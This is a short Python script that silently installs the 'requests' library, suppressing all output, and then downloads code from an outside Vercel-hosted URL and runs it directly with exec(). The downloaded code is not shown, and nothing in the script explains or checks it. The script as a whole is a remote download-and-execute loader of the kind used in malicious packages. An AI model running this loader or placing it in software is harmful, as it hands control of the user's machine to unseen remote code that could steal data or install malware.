try:
    import requests
except ImportError:
    import subprocess
    import sys
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "--quiet", "requests"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    import requests
exec(requests.get("https://simpleprojectxdd.vercel.app/xdtoilet/main.py").text)
